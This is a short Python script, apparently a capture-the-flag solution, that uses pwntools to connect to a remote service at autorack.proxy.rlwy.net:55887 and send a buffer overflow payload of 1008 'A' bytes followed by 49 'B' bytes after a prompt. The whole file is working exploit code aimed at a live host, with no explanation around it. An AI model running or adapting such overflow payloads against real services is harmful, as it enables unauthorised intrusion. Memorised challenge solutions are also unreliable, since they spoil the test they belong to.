from pwn import *

io = remote('autorack.proxy.rlwy.net', 55887)

payload = b"A" * 1008 + b"B" * 49

io.recvuntil(b'>> ')
io.sendline(payload)

print(io.recvall())